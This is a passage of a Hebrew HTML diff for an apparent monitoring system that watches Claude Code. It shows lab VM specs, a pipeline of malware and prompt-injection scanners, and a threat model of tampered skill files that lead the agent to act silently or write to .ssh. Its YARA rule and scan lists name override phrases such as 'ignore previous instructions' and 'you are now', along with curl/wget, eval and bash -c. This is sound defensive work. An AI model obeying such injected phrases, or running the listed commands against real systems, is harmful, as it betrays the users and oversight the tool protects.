+    <div class="hw-row"><span class="hw-label">דיסק</span><span class="hw-value ok">40 GB</span></div>
+    <div class="hw-row"><span class="hw-label">Domain</span><span class="hw-value ok">ehzlab.local</span></div>
+    <div class="hw-row"><span class="hw-label">רישיון</span><span class="hw-value ok">חינמי 180 יום</span></div>
+    <div style="margin-top:12px; font-size:11px; color:var(--muted); line-height:1.8;">
+      ✔ AD DS + DNS<br>
+      ✔ OU: CCSM-Users<br>
+      ✔ קבוצות: CCSM-Admins, CCSM-Analysts<br>
+      ✔ Service Account: ccsm-svc<br>
+      ✔ GPO: CCSM-Deploy<br>
+      ✔ 3–5 משתמשי בדיקה
+    </div>
+  </div>
+
+  <div class="hw-card" style="border-top: 3px solid #0ea5e9;">
+    <div class="hw-card-title" style="color:#7dd3fc;">VM-2 — CCSM Server</div>
+    <div class="hw-row"><span class="hw-label">שם</span><span class="hw-value" style="color:#7dd3fc;">CCSM-SRV01</span></div>
+    <div class="hw-row"><span class="hw-label">OS</span><span class="hw-value ok">Ubuntu 22.04 LTS</span></div>
+    <div class="hw-row"><span class="hw-label">CPU / RAM</span><span class="hw-value ok">2 vCores / 4 GB</span></div>
+    <div class="hw-row"><span class="hw-label">דיסק</span><span class="hw-value ok">30 GB</span></div>
+    <div class="hw-row"><span class="hw-label">IP</span><span class="hw-value ok">Static 192.168.1.10</span></div>
+    <div class="hw-row"><span class="hw-label">רישיון</span><span class="hw-value ok">חינמי</span></div>
+    <div style="margin-top:12px; font-size:11px; color:var(--muted); line-height:1.8;">
+      ✔ Collector + Dashboard<br>
+      ✔ PostgreSQL 15+<br>
+      ✔ nginx + SSL<br>
+      ✔ PM2<br>
+      ✔ Join to Domain (LDAP)<br>
+      ✔ Port 3010 / 3011 / 443
+    </div>
+  </div>
+
+  <div class="hw-card" style="border-top: 3px solid #10b981;">
+    <div class="hw-card-title" style="color:#6ee7b7;">VM-3 — Workstation</div>
+    <div class="hw-row"><span class="hw-label">שם</span><span class="hw-value" style="color:#6ee7b7;">CORP-WS01</span></div>
+    <div class="hw-row"><span class="hw-label">OS</span><span class="hw-value ok">Windows 11 Pro</span></div>
+    <div class="hw-row"><span class="hw-label">CPU / RAM</span><span class="hw-value ok">2 vCores / 4 GB</span></div>
+    <div class="hw-row"><span class="hw-label">דיסק</span><span class="hw-value ok">30 GB</span></div>
+    <div class="hw-row"><span class="hw-label">Join Domain</span><span class="hw-value ok">ehzlab.local</span></div>
+    <div class="hw-row"><span class="hw-label">רישיון</span><span class="hw-value warn">Evaluation / קיים</span></div>
+    <div style="margin-top:12px; font-size:11px; color:var(--muted); line-height:1.8;">
+      ✔ Claude Code מותקן<br>
+      ✔ CCSM Agent מותקן (GPO)<br>
+      ✔ מנוטרת אוטומטית<br>
+      ✔ משתמש Domain: testuser01<br>
+      ✔ Node.js 20 LTS
+    </div>
+  </div>
+
+</div>
+
+<!-- Lab topology diagram -->
+<div class="hw-card" style="margin-bottom:16px;">
+  <div class="hw-card-title">טופולוגיית רשת — Lab</div>
+  <pre style="font-size:12px; color:var(--muted); line-height:1.8; font-family:monospace; margin-top:8px;">
+  Hyper-V Internal Switch: 192.168.1.0/24
+  ┌─────────────────────────────────────────────────┐
+  │                                                 │
+  │  [CORP-DC01]          [CCSM-SRV01]             │
+  │  192.168.1.1          192.168.1.10             │
+  │  AD + DNS             Collector:3010            │
+  │                       Dashboard:3011            │
+  │         \                   /                   │
+  │          ───────────────────                    │
+  │                   |                             │
+  │             [CORP-WS01]                         │
+  │             192.168.1.20                        │
+  │             Claude Code + Agent                 │
+  │                                                 │
+  └─────────────────────────────────────────────────┘
+  המחשב הפיזי: NAT → גישת אינטרנט לכל VMs
+  </pre>
+</div>
+
+<!-- Timeline -->
+<div class="hw-card" style="margin-bottom:16px;">
+  <div class="hw-card-title">ציר זמן הקמת Lab — ~4 שעות</div>
+  <div class="hw-row"><span class="hw-label">שעה 1</span><span class="hw-value ok">VM-1: DC + AD + DNS + משתמשים + GPO</span></div>
+  <div class="hw-row"><span class="hw-label">שעה 2</span><span class="hw-value ok">VM-2: Ubuntu + PostgreSQL + CCSM Server</span></div>
+  <div class="hw-row"><span class="hw-label">שעה 3</span><span class="hw-value ok">VM-3: Join domain + Claude Code + GPO deploy</span></div>
+  <div class="hw-row"><span class="hw-label">שעה 4</span><span class="hw-value ok">בדיקות end-to-end: hook → collector → dashboard</span></div>
+</div>
+
+<!-- Cloud alternative -->
+<div class="hw-card" style="margin-bottom:16px; border-color: rgba(249,115,22,0.2);">
+  <div class="hw-card-title" style="color:var(--orange);">אפשרות ב — Cloud Lab (אם אין מספיק RAM)</div>
+  <div class="hw-row"><span class="hw-label">Kamatera (קיים)</span><span class="hw-value ok">CCSM-SRV01 — כבר שלך</span></div>
+  <div class="hw-row"><span class="hw-label">Azure Dev/Test</span><span class="hw-value warn">~$50/חודש — DC + Workstation</span></div>
+  <div class="hw-row"><span class="hw-label">Azure AD</span><span class="hw-value warn">Azure AD Domain Services ~$100/חודש</span></div>
+  <div class="hw-row"><span class="hw-label">חיסכון</span><span class="hw-value ok">שרת Kamatera כCCSM-SRV — חוסך VM נוסף</span></div>
+</div>
+
+<div class="hw-note" style="background: rgba(16,185,129,0.08); border-color: rgba(16,185,129,0.25); color: var(--green);">
+  💡 המלצה: שלב א' על המחשב הנוכחי בלבד (ללא VMs). שלב ב' — 3 VMs על Hyper-V לפי הטבלה למעלה. Windows Server 2022 Evaluation + Ubuntu 22.04 חינמיים לחלוטין לצורך הבדיקות.
+</div>
+
+<div style="height:32px;"></div>
+
+<!-- EXTERNAL SCAN ENGINES -->
+<div class="section-title">מנועי סריקה חיצוניים — External Scan Engines (חינמיים)</div>
+
+<!-- What gets scanned -->
+<div class="hw-card" style="margin-bottom:16px; border-color:rgba(14,165,233,0.25);">
+  <div class="hw-card-title" style="color:var(--accent);">מה נסרק — כל קובץ שClaude משתמש בו</div>
+  <div style="display:grid;grid-template-columns:repeat(auto-fill,minmax(200px,1fr));gap:10px;margin-top:10px;">
+    <div style="background:rgba(14,165,233,0.07);border-radius:8px;padding:10px;font-size:12px;">
+      <div style="color:var(--accent);font-weight:700;margin-bottom:5px;">🔧 סקילים</div>
+      <div style="color:var(--muted);line-height:1.7;">כל .md שנטען<br>לפני הפעלה ראשונה</div>
+    </div>
+    <div style="background:rgba(14,165,233,0.07);border-radius:8px;padding:10px;font-size:12px;">
+      <div style="color:var(--accent);font-weight:700;margin-bottom:5px;">📁 קבצים שמועלים</div>
+      <div style="color:var(--muted);line-height:1.7;">כל קובץ שנכתב / נקרא<br>מחוץ לתיקיית הפרויקט</div>
+    </div>
+    <div style="background:rgba(14,165,233,0.07);border-radius:8px;padding:10px;font-size:12px;">
+      <div style="color:var(--accent);font-weight:700;margin-bottom:5px;">🌐 URLs</div>
+      <div style="color:var(--muted);line-height:1.7;">כל URL ב-WebFetch<br>לפני הגישה</div>
+    </div>
+    <div style="background:rgba(14,165,233,0.07);border-radius:8px;padding:10px;font-size:12px;">
+      <div style="color:var(--accent);font-weight:700;margin-bottom:5px;">📦 חבילות npm</div>
+      <div style="color:var(--muted);line-height:1.7;">package.json שנוצר<br>npm install חדש</div>
+    </div>
+    <div style="background:rgba(14,165,233,0.07);border-radius:8px;padding:10px;font-size:12px;">
+      <div style="color:var(--accent);font-weight:700;margin-bottom:5px;">📜 סקריפטים</div>
+      <div style="color:var(--muted);line-height:1.7;">.sh / .ps1 / .py<br>לפני הרצה</div>
+    </div>
+    <div style="background:rgba(14,165,233,0.07);border-radius:8px;padding:10px;font-size:12px;">
+      <div style="color:var(--accent);font-weight:700;margin-bottom:5px;">⚙️ קבצי config</div>
+      <div style="color:var(--muted);line-height:1.7;">.json / .env / .yaml<br>שינויים בהגדרות</div>
+    </div>
+  </div>
+</div>
+
+<!-- Engines grid -->
+<div style="display:grid;grid-template-columns:repeat(auto-fill,minmax(300px,1fr));gap:16px;margin-bottom:16px;">
+
+  <!-- YARA -->
+  <div class="hw-card" style="border-top:3px solid #10b981;">
+    <div style="display:flex;align-items:center;gap:10px;margin-bottom:12px;">
+      <div style="background:rgba(16,185,129,0.15);border-radius:8px;padding:8px;font-size:20px;">🛡</div>
+      <div>
+        <div style="font-weight:800;font-size:14px;">YARA Rules Engine</div>
+        <div style="font-size:11px;color:var(--green);font-weight:700;">✅ קוד פתוח — חינמי לחלוטין</div>
+      </div>
+    </div>
+    <div class="hw-row"><span class="hw-label">מה מזהה</span><span class="hw-value ok">Prompt Injection, דפוסים מותאמים</span></div>
+    <div class="hw-row"><span class="hw-label">מהירות</span><span class="hw-value ok">מהיר מאוד — מקומי</span></div>
+    <div class="hw-row"><span class="hw-label">מגבלה</span><span class="hw-value ok">אין</span></div>
+    <div class="hw-row"><span class="hw-label">מתאים ל</span><span class="hw-value ok">סקילים, סקריפטים, config</span></div>
+    <div style="margin-top:10px;background:rgba(0,0,0,0.3);border-radius:6px;padding:10px;font-family:monospace;font-size:10px;color:#6ee7b7;line-height:1.8;">
+      rule PromptInjection {<br>
+      &nbsp;&nbsp;strings:<br>
+      &nbsp;&nbsp;&nbsp;&nbsp;$a = "ignore previous" nocase<br>
+      &nbsp;&nbsp;&nbsp;&nbsp;$b = "you are now" nocase<br>
+      &nbsp;&nbsp;&nbsp;&nbsp;$c = /\[INST\].*\[\/INST\]/<br>
+      &nbsp;&nbsp;condition: any of them<br>
+      }
+    </div>
+  </div>
+
+  <!-- Semgrep -->
+  <div class="hw-card" style="border-top:3px solid #10b981;">
+    <div style="display:flex;align-items:center;gap:10px;margin-bottom:12px;">
+      <div style="background:rgba(16,185,129,0.15);border-radius:8px;padding:8px;font-size:20px;">🔍</div>
+      <div>
+        <div style="font-weight:800;font-size:14px;">Semgrep</div>
+        <div style="font-size:11px;color:var(--green);font-weight:700;">✅ קוד פתוח — חינמי לחלוטין</div>
+      </div>
+    </div>
+    <div class="hw-row"><span class="hw-label">מה מזהה</span><span class="hw-value ok">קוד מסוכן: eval, exec, child_process</span></div>
+    <div class="hw-row"><span class="hw-label">מהירות</span><span class="hw-value ok">מהיר — מקומי</span></div>
+    <div class="hw-row"><span class="hw-label">מגבלה</span><span class="hw-value ok">אין</span></div>
+    <div class="hw-row"><span class="hw-label">מתאים ל</span><span class="hw-value ok">סקריפטים, .js, .py, .sh</span></div>
+    <div style="margin-top:10px;background:rgba(0,0,0,0.3);border-radius:6px;padding:10px;font-family:monospace;font-size:10px;color:#6ee7b7;line-height:1.8;">
+      semgrep --config "p/security-audit" file.js<br>
+      semgrep --config "p/secrets" config.json<br>
+      # מזהה: eval(), os.system(),<br>
+      # subprocess, secrets בקוד
+    </div>
+  </div>
+
+  <!-- OpenAI Moderation -->
+  <div class="hw-card" style="border-top:3px solid #10b981;">
+    <div style="display:flex;align-items:center;gap:10px;margin-bottom:12px;">
+      <div style="background:rgba(16,185,129,0.15);border-radius:8px;padding:8px;font-size:20px;">🤖</div>
+      <div>
+        <div style="font-weight:800;font-size:14px;">OpenAI Moderation API</div>
+        <div style="font-size:11px;color:var(--green);font-weight:700;">✅ API חינמי לחלוטין</div>
+      </div>
+    </div>
+    <div class="hw-row"><span class="hw-label">מה מזהה</span><span class="hw-value ok">תוכן מזיק, הוראות עוינות</span></div>
+    <div class="hw-row"><span class="hw-label">מהירות</span><span class="hw-value ok">~200ms</span></div>
+    <div class="hw-row"><span class="hw-label">מגבלה</span><span class="hw-value ok">ללא מגבלה ידועה</span></div>
+    <div class="hw-row"><span class="hw-label">מתאים ל</span><span class="hw-value ok">סקילים, תוכן טקסטואלי</span></div>
+    <div style="margin-top:10px;background:rgba(0,0,0,0.3);border-radius:6px;padding:10px;font-family:monospace;font-size:10px;color:#6ee7b7;line-height:1.8;">
+      POST /v1/moderations<br>
+      { "input": skillContent }<br>
+      → categories: {<br>
+      &nbsp;&nbsp;hate, violence,<br>
+      &nbsp;&nbsp;self-harm, harassment<br>
+      }
+    </div>
+  </div>
+
+  <!-- Google Safe Browsing -->
+  <div class="hw-card" style="border-top:3px solid #10b981;">
+    <div style="display:flex;align-items:center;gap:10px;margin-bottom:12px;">
+      <div style="background:rgba(16,185,129,0.15);border-radius:8px;padding:8px;font-size:20px;">🌐</div>
+      <div>
+        <div style="font-weight:800;font-size:14px;">Google Safe Browsing</div>
+        <div style="font-size:11px;color:var(--green);font-weight:700;">✅ חינמי — 10,000 בקשות/יום</div>
+      </div>
+    </div>
+    <div class="hw-row"><span class="hw-label">מה מזהה</span><span class="hw-value ok">Malware, Phishing, Unwanted SW</span></div>
+    <div class="hw-row"><span class="hw-label">מהירות</span><span class="hw-value ok">~300ms</span></div>
+    <div class="hw-row"><span class="hw-label">מגבלה</span><span class="hw-value ok">10,000/יום</span></div>
+    <div class="hw-row"><span class="hw-label">מתאים ל</span><span class="hw-value ok">כל URL לפני WebFetch</span></div>
+    <div style="margin-top:10px;background:rgba(0,0,0,0.3);border-radius:6px;padding:10px;font-family:monospace;font-size:10px;color:#6ee7b7;line-height:1.8;">
+      POST /v4/threatMatches:find<br>
+      { urls: [url1, url2...] }<br>
+      → MALWARE /<br>
+      &nbsp;&nbsp;SOCIAL_ENGINEERING /<br>
+      &nbsp;&nbsp;UNWANTED_SOFTWARE
+    </div>
+  </div>
+
+  <!-- VirusTotal -->
+  <div class="hw-card" style="border-top:3px solid #f59e0b;">
+    <div style="display:flex;align-items:center;gap:10px;margin-bottom:12px;">
+      <div style="background:rgba(245,158,11,0.15);border-radius:8px;padding:8px;font-size:20px;">🦠</div>
+      <div>
+        <div style="font-weight:800;font-size:14px;">VirusTotal API</div>
+        <div style="font-size:11px;color:var(--yellow);font-weight:700;">⚠️ חינמי — 500 בקשות/יום</div>
+      </div>
+    </div>
+    <div class="hw-row"><span class="hw-label">מה מזהה</span><span class="hw-value ok">70+ אנטי-וירוסים במקביל</span></div>
+    <div class="hw-row"><span class="hw-label">מהירות</span><span class="hw-value warn">~2-5 שניות</span></div>
+    <div class="hw-row"><span class="hw-label">מגבלה</span><span class="hw-value warn">500 בקשות/יום</span></div>
+    <div class="hw-row"><span class="hw-label">מתאים ל</span><span class="hw-value ok">קבצים חשודים, URLs, hash</span></div>
+    <div style="margin-top:10px;background:rgba(0,0,0,0.3);border-radius:6px;padding:10px;font-family:monospace;font-size:10px;color:#fde68a;line-height:1.8;">
+      GET /v3/files/{sha256}<br>
+      GET /v3/urls/{url_id}<br>
+      → last_analysis_stats: {<br>
+      &nbsp;&nbsp;malicious: 0,<br>
+      &nbsp;&nbsp;suspicious: 0<br>
+      }
+    </div>
+  </div>
+
+  <!-- ClamAV -->
+  <div class="hw-card" style="border-top:3px solid #10b981;">
+    <div style="display:flex;align-items:center;gap:10px;margin-bottom:12px;">
+      <div style="background:rgba(16,185,129,0.15);border-radius:8px;padding:8px;font-size:20px;">🔬</div>
+      <div>
+        <div style="font-weight:800;font-size:14px;">ClamAV</div>
+        <div style="font-size:11px;color:var(--green);font-weight:700;">✅ קוד פתוח — חינמי לחלוטין</div>
+      </div>
+    </div>
+    <div class="hw-row"><span class="hw-label">מה מזהה</span><span class="hw-value ok">malware signatures מקומי</span></div>
+    <div class="hw-row"><span class="hw-label">מהירות</span><span class="hw-value ok">מהיר — לא צריך API</span></div>
+    <div class="hw-row"><span class="hw-label">מגבלה</span><span class="hw-value ok">אין</span></div>
+    <div class="hw-row"><span class="hw-label">מתאים ל</span><span class="hw-value ok">כל קובץ — סריקה מקומית</span></div>
+    <div style="margin-top:10px;background:rgba(0,0,0,0.3);border-radius:6px;padding:10px;font-family:monospace;font-size:10px;color:#6ee7b7;line-height:1.8;">
+      clamscan --infected skill.md<br>
+      clamscan -r ./skills/<br>
+      → scan DONE<br>
+      &nbsp;&nbsp;Infected files: 0
+    </div>
+  </div>
+
+</div>
+
+<!-- Scan pipeline -->
+<div class="hw-card" style="margin-bottom:16px;">
+  <div class="hw-card-title">pipeline סריקה — סדר ביצוע לכל קובץ</div>
+  <pre style="font-size:12px; color:var(--muted); line-height:2; font-family:monospace; margin-top:10px;">
+  קובץ חדש / שינוי קובץ קיים
+          ↓
+  ① YARA Rules (מקומי, &lt;10ms)
+    → Prompt Injection patterns
+    → נכשל → ❌ CRITICAL + הסגר מיידי
+          ↓ עבר
+  ② Semgrep (מקומי, &lt;500ms)
+    → eval/exec/child_process/secrets
+    → נכשל → ❌ HIGH + הסגר
+          ↓ עבר
+  ③ ClamAV (מקומי, &lt;1s)
+    → malware signatures
+    → נכשל → ❌ CRITICAL + הסגר
+          ↓ עבר
+  ④ OpenAI Moderation (API חינמי, ~200ms)
+    → תוכן מזיק / הוראות עוינות
+    → נכשל → ❌ HIGH + review
+          ↓ עבר
+  ⑤ Google Safe Browsing (URLs בלבד, ~300ms)
+    → Malware / Phishing URLs בתוכן
+    → נכשל → ❌ HIGH
+          ↓ עבר
+  ⑥ VirusTotal (קבצים חשודים בלבד, ~3s)
+    → 70+ engines
+    → נכשל → ❌ CRITICAL
+          ↓ עבר
+  ✅ CLEAN — שמירת hash + אישור
+  </pre>
+</div>
+
+<!-- Engines comparison table -->
+<div class="hw-card" style="margin-bottom:16px; overflow-x:auto;">
+  <div class="hw-card-title">השוואת מנועים</div>
+  <table style="width:100%;border-collapse:collapse;font-size:12px;margin-top:10px;">
+    <thead>
+      <tr style="border-bottom:1px solid var(--border2);">
+        <th style="padding:8px;text-align:right;color:var(--muted2);font-weight:700;">מנוע</th>
+        <th style="padding:8px;text-align:right;color:var(--muted2);font-weight:700;">מה מזהה</th>
+        <th style="padding:8px;text-align:center;color:var(--muted2);font-weight:700;">עלות</th>
+        <th style="padding:8px;text-align:center;color:var(--muted2);font-weight:700;">מגבלה/יום</th>
+        <th style="padding:8px;text-align:center;color:var(--muted2);font-weight:700;">מהירות</th>
+        <th style="padding:8px;text-align:center;color:var(--muted2);font-weight:700;">רשת</th>
+      </tr>
+    </thead>
+    <tbody>
+      <tr style="border-bottom:1px solid var(--border);">
+        <td style="padding:8px;font-weight:700;color:#6ee7b7;">YARA</td>
+        <td style="padding:8px;color:var(--muted2);">Prompt Injection, דפוסים</td>
+        <td style="padding:8px;text-align:center;color:var(--green);">חינמי</td>
+        <td style="padding:8px;text-align:center;color:var(--green);">∞ אין</td>
+        <td style="padding:8px;text-align:center;color:var(--green);">&lt;10ms</td>
+        <td style="padding:8px;text-align:center;">❌ לא צריך</td>
+      </tr>
+      <tr style="border-bottom:1px solid var(--border);">
+        <td style="padding:8px;font-weight:700;color:#6ee7b7;">Semgrep</td>
+        <td style="padding:8px;color:var(--muted2);">קוד מסוכן, secrets</td>
+        <td style="padding:8px;text-align:center;color:var(--green);">חינמי</td>
+        <td style="padding:8px;text-align:center;color:var(--green);">∞ אין</td>
+        <td style="padding:8px;text-align:center;color:var(--green);">&lt;500ms</td>
+        <td style="padding:8px;text-align:center;">❌ לא צריך</td>
+      </tr>
+      <tr style="border-bottom:1px solid var(--border);">
+        <td style="padding:8px;font-weight:700;color:#6ee7b7;">ClamAV</td>
+        <td style="padding:8px;color:var(--muted2);">malware signatures</td>
+        <td style="padding:8px;text-align:center;color:var(--green);">חינמי</td>
+        <td style="padding:8px;text-align:center;color:var(--green);">∞ אין</td>
+        <td style="padding:8px;text-align:center;color:var(--green);">&lt;1s</td>
+        <td style="padding:8px;text-align:center;">❌ לא צריך</td>
+      </tr>
+      <tr style="border-bottom:1px solid var(--border);">
+        <td style="padding:8px;font-weight:700;color:#6ee7b7;">OpenAI Mod</td>
+        <td style="padding:8px;color:var(--muted2);">תוכן מזיק, הוראות עוינות</td>
+        <td style="padding:8px;text-align:center;color:var(--green);">חינמי</td>
+        <td style="padding:8px;text-align:center;color:var(--green);">∞ אין</td>
+        <td style="padding:8px;text-align:center;color:var(--green);">~200ms</td>
+        <td style="padding:8px;text-align:center;">✅ API key</td>
+      </tr>
+      <tr style="border-bottom:1px solid var(--border);">
+        <td style="padding:8px;font-weight:700;color:#6ee7b7;">Safe Browsing</td>
+        <td style="padding:8px;color:var(--muted2);">Malware/Phishing URLs</td>
+        <td style="padding:8px;text-align:center;color:var(--green);">חינמי</td>
+        <td style="padding:8px;text-align:center;color:var(--yellow);">10,000</td>
+        <td style="padding:8px;text-align:center;color:var(--green);">~300ms</td>
+        <td style="padding:8px;text-align:center;">✅ API key</td>
+      </tr>
+      <tr>
+        <td style="padding:8px;font-weight:700;color:#fde68a;">VirusTotal</td>
+        <td style="padding:8px;color:var(--muted2);">70+ AV engines</td>
+        <td style="padding:8px;text-align:center;color:var(--green);">חינמי</td>
+        <td style="padding:8px;text-align:center;color:var(--yellow);">500</td>
+        <td style="padding:8px;text-align:center;color:var(--yellow);">~3s</td>
+        <td style="padding:8px;text-align:center;">✅ API key</td>
+      </tr>
+    </tbody>
+  </table>
+</div>
+
+<!-- API Keys needed -->
+<div class="hw-card" style="margin-bottom:16px;">
+  <div class="hw-card-title">API Keys נדרשים — כולם חינמיים</div>
+  <div class="hw-row"><span class="hw-label">OpenAI Moderation</span><span class="hw-value ok">platform.openai.com → API Keys (חינמי)</span></div>
+  <div class="hw-row"><span class="hw-label">Google Safe Browsing</span><span class="hw-value ok">console.cloud.google.com → Enable API (חינמי)</span></div>
+  <div class="hw-row"><span class="hw-label">VirusTotal</span><span class="hw-value ok">virustotal.com/gui/join-us (חינמי)</span></div>
+  <div class="hw-row"><span class="hw-label">YARA</span><span class="hw-value ok">npm install yara — אין צורך ב-key</span></div>
+  <div class="hw-row"><span class="hw-label">Semgrep</span><span class="hw-value ok">npm install @semgrep/semgrep — אין צורך ב-key</span></div>
+  <div class="hw-row"><span class="hw-label">ClamAV</span><span class="hw-value ok">winget install ClamAV — אין צורך ב-key</span></div>
+</div>
+
+<div class="hw-note" style="margin-bottom:0;">
+  💡 שלבים 1-3 (YARA + Semgrep + ClamAV) רצים מקומית ללא אינטרנט — אפס latency. שלבים 4-6 (APIs) רצים רק אם הסריקה המקומית עברה ורק על קבצים/URLs חשודים.
+</div>
+
+<div style="height:32px;"></div>
+
+<!-- SKILL SECURITY -->
+<div class="section-title">אבטחת סקילים — Skill Security & Pre-Install Scanner</div>
+
+<!-- threat model -->
+<div class="hw-card" style="margin-bottom:16px; border-color:rgba(239,68,68,0.25);">
+  <div class="hw-card-title" style="color:#fca5a5;">מודל איום — סקיל נגוע</div>
+  <div style="display:grid;grid-template-columns:repeat(auto-fill,minmax(220px,1fr));gap:12px;margin-top:10px;">
+    <div style="background:rgba(239,68,68,0.07);border-radius:8px;padding:12px;font-size:12px;">
+      <div style="color:#fca5a5;font-weight:700;margin-bottom:6px;">תרחיש א</div>
+      <div style="color:var(--muted);line-height:1.7;">תוקף משנה קובץ סקיל קיים<br>→ Claude מבצע הוראות זדוניות בשקט</div>
+    </div>
+    <div style="background:rgba(239,68,68,0.07);border-radius:8px;padding:12px;font-size:12px;">
+      <div style="color:#fca5a5;font-weight:700;margin-bottom:6px;">תרחיש ב</div>
+      <div style="color:var(--muted);line-height:1.7;">סקיל "חדש" מותקן ממקור לא ידוע<br>→ Claude סומך עליו אוטומטית</div>
+    </div>
+    <div style="background:rgba(239,68,68,0.07);border-radius:8px;padding:12px;font-size:12px;">
+      <div style="color:#fca5a5;font-weight:700;margin-bottom:6px;">תרחיש ג</div>
+      <div style="color:var(--muted);line-height:1.7;">Prompt Injection מוסתר בתוכן<br>→ תווים נסתרים / הוראות מוסוות</div>
+    </div>
+    <div style="background:rgba(239,68,68,0.07);border-radius:8px;padding:12px;font-size:12px;">
+      <div style="color:#fca5a5;font-weight:700;margin-bottom:6px;">תרחיש ד</div>
+      <div style="color:var(--muted);line-height:1.7;">סקיל לגיטימי מתנהג חריג<br>→ SEO skill מריץ Bash / כותב ל-.ssh</div>
+    </div>
+  </div>
+</div>
+
+<!-- Pre-install scanner -->
+<div class="phase-block" style="margin-bottom:16px;">
+  <div class="phase-header">
+    <div class="phase-num a" style="font-size:14px;">SCAN</div>
+    <div class="phase-info">
+      <h3>Pre-Install Scanner — סריקה לפני כל התקנת סקיל</h3>
+      <p>כל סקיל עובר 4 שלבי בדיקה לפני שמותר לו לפעול</p>
+    </div>
+    <div class="phase-status status-active">חובה</div>
+  </div>
+  <div class="tasks-grid">
+    <div class="task-cell">
+      <div class="task-num">SCAN-01</div>
+      <div class="task-title">בדיקת מבנה קובץ</div>
+      <div class="task-desc">
+        האם זה Markdown תקני?<br>
+        האם יש frontmatter תקין?<br>
+        גודל קובץ חריג (&gt;500KB)?<br>
+        קידוד חריג (לא UTF-8)?
+      </div>
+      <div class="task-tags"><span class="tag">structure</span></div>
+    </div>
+    <div class="task-cell">
+      <div class="task-num">SCAN-02</div>
+      <div class="task-title">סריקת Prompt Injection</div>
+      <div class="task-desc">
+        "ignore previous instructions"<br>
+        "you are now" / "new persona"<br>
+        Token injection: &lt;|...|&gt; / [INST]<br>
+        תווים נסתרים: U+200B, U+FEFF
+      </div>
+      <div class="task-tags"><span class="tag">injection</span><span class="tag">steganography</span></div>
+    </div>
+    <div class="task-cell">
+      <div class="task-num">SCAN-03</div>
+      <div class="task-title">סריקת פקודות מסוכנות</div>
+      <div class="task-desc">
+        curl/wget בתוך הסקיל<br>
+        eval() / exec() / bash -c<br>
+        require('child_process')<br>
+        command substitution: $(...) / `...`
+      </div>
+      <div class="task-tags"><span class="tag">commands</span></div>
+    </div>
+    <div class="task-cell">
+      <div class="task-num">SCAN-04</div>
+      <div class="task-title">אימות מקור וחתימה</div>
+      <div class="task-desc">
+        מאיפה הגיע הקובץ?<br>
+        חישוב SHA-256 ושמירה<br>
+        האם נוצר ע"י ערן ידנית?<br>
+        האם הנתיב תקין?
+      </div>
+      <div class="task-tags"><span class="tag">hash</span><span class="tag">origin</span></div>
+    </div>
+  </div>
+</div>
+
+<!-- Scan flow -->
+<div class="hw-card" style="margin-bottom:16px;">
+  <div class="hw-card-title">זרימת Pre-Install Scan</div>
+  <pre style="font-size:12px; color:var(--muted); line-height:1.9; font-family:monospace; margin-top:8px;">
+  סקיל חדש מתגלה / מותקן
+          ↓
+  SCAN-01: מבנה תקין?
+    לא → ❌ BLOCKED + CRITICAL alert
+    כן ↓
+  SCAN-02: Prompt Injection?
+    כן → ❌ BLOCKED + CRITICAL alert + קובץ בהסגר
+    לא ↓
+  SCAN-03: פקודות מסוכנות?
+    כן → ❌ BLOCKED + HIGH alert
+    לא ↓
+  SCAN-04: מקור ידוע + חתימה?
+    לא → ⚠️  MEDIUM alert + ממתין לאישור ידני
+    כן ↓
+  ✅ APPROVED — שמירת hash + metadata
+          ↓
+  סקיל פעיל — מנוטר בזמן ריצה
+  </pre>
+</div>
+
+<!-- Runtime monitoring -->
+<div class="hw-card" style="margin-bottom:16px;">
+  <div class="hw-card-title">ניטור סקילים בזמן ריצה</div>
+  <table style="width:100%;border-collapse:collapse;font-size:12px;">
+    <tr style="border-bottom:1px solid var(--border);">
+      <th style="text-align:right;padding:8px 4px;color:var(--muted);">תנאי</th>
+      <th style="text-align:right;padding:8px 4px;color:var(--muted);">חשד</th>
+      <th style="text-align:center;padding:8px 4px;color:var(--muted);">רמה</th>
+    </tr>
+    <tr style="border-bottom:1px solid var(--border);">
+      <td style="padding:7px 4px;font-family:monospace;color:#fca5a5;">Hash השתנה מאז אישור</td>
+      <td style="padding:7px 4px;color:var(--muted);">סקיל שונה ע"י גורם חיצוני</td>
+      <td style="text-align:center;">🔴</td>
+    </tr>
+    <tr style="border-bottom:1px solid var(--border);">
+      <td style="padding:7px 4px;font-family:monospace;color:#fca5a5;">SEO skill → Bash/Write/.ssh</td>
+      <td style="padding:7px 4px;color:var(--muted);">פעולה מחוץ לתחום הסקיל</td>
+      <td style="text-align:center;">🔴</td>
+    </tr>
+    <tr style="border-bottom:1px solid var(--border);">
+      <td style="padding:7px 4px;font-family:monospace;color:#fca5a5;">סקיל כותב לנתיב מערכת</td>
+      <td style="padding:7px 4px;color:var(--muted);">סקיל נגוע / Injection</td>
+      <td style="text-align:center;">🔴</td>
+    </tr>
+    <tr style="border-bottom:1px solid var(--border);">
+      <td style="padding:7px 4px;font-family:monospace;color:#fca5a5;">תווים נסתרים התגלו בריצה</td>
+      <td style="padding:7px 4px;color:var(--muted);">Steganography injection</td>
+      <td style="text-align:center;">🟠</td>
+    </tr>
+    <tr style="border-bottom:1px solid var(--border);">
+      <td style="padding:7px 4px;font-family:monospace;color:#fdba74;">סקיל שונה ע"י process לא ידוע</td>
+      <td style="padding:7px 4px;color:var(--muted);">שינוי לא מורשה</td>
+      <td style="text-align:center;">🟠</td>
+    </tr>
+    <tr style="border-bottom:1px solid var(--border);">
+      <td style="padding:7px 4px;font-family:monospace;color:#fde68a;">סקיל חדש — לא עבר scan</td>
+      <td style="padding:7px 4px;color:var(--muted);">התקנה לא מורשית</td>
+      <td style="text-align:center;">🟡</td>
+    </tr>
+    <tr>
+      <td style="padding:7px 4px;font-family:monospace;color:#c4b5fd;">סקיל ישן — לא השתמשו 30 יום</td>
+      <td style="padding:7px 4px;color:var(--muted);">סקיל מיותר — מועמד להסרה</td>
+      <td style="text-align:center;">⚪</td>
+    </tr>
+  </table>
+</div>
+
+<!-- Skills registry -->
+<div class="hw-card" style="margin-bottom:16px;">
+  <div class="hw-card-title">Skill Registry — מאגר סקילים מאושרים</div>
+  <div style="font-size:12px;color:var(--muted);margin-bottom:10px;">נשמר ב: <span style="font-family:monospace;color:var(--accent);">~/.ccsm/skills-registry.json</span></div>
+  <pre style="font-size:11px; color:var(--muted); line-height:1.7; font-family:monospace; background:rgba(0,0,0,0.3); padding:12px; border-radius:8px; overflow-x:auto;">
+{
+  "skills": [
+    {
+      "name": "seo.md",
+      "path": "C:/Users/Eran/.claude/skills/seo.md",
+      "sha256": "a3f9c2b1d4e8...",
+      "approved_by": "eran",
